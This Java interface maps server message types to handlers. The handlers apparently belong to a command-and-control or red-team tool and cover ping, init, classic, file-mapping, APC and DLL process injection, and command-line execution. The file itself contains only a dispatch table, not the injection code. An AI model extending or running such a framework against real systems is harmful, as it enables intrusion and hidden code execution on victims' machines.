package org.server.handle;

import org.server.message.Message;
import org.server.message.MessageType;

import java.util.HashMap;


import static org.server.message.MessageType.*;

public interface Handler {

    HashMap<MessageType, Handler> handlerAssociation = new HashMap<>()
    {{
        put(MessageType.PING, new PingHandler());
        put(MessageType.INIT, new InitHandler());
        put(MessageType.CLASSIC_INJECTION, new ClassicInjectionHandler());
        put(MessageType.FILE_MAPPING_INJECTION, new FileMappingInjectionHandler());
        put(MessageType.APC_TASK_INJECTION, new APCInjectionHandler());
        put(MessageType.DLL_INJECTION, new DLLInjectionHandler());
        put(MessageType.COMMAND_LINE_EXECUTION, new CommandLineTaskHandler());
    }};

    static Handler getHandle(Message message)
    {
        return Handler.handlerAssociation.get(message.getType());
    }

    byte[] handle();
}
